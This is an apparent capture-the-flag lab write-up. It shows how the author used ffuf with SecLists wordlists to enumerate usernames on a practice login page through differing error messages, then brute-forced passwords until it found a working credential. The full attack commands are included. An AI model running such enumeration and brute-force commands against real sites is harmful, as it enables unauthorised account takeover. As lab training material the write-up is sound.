
Daily challenge.
Hint: *Passwords are a legacy security control...*

On the login page, when entering wrong username or password, I got different messages. The username enumeration is possible.
I used `ffuf` to do that, with a command: `ffuf -u "https://lab-1788934150943-4bfrmh.labs-app.bugforge.io/login" -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -d "username=FUZZ&password=invalidpass" -H "Content-Type: application/x-www-form-urlencoded" -fs 46`

In a few second I enumerated users:
```
carlos
kevin
jeremy
jenny
administrator
```

I created a file `usernames.txt`, and started fuzzing them with passwords.
`ffuf -u "https://lab-1788934150943-4bfrmh.labs-app.bugforge.io/login" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt:PASS -w usernames.txt:USER -X POST -d "username=USER&password=PASS" -H "Content-Type: application/x-www-form-urlencoded" -fs 50 -rate 10`

I fuzzed every enumerated username with `/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt` wordlists, and I got a hit with `jeremy:gift`.

![](Images/giftlab-003.png)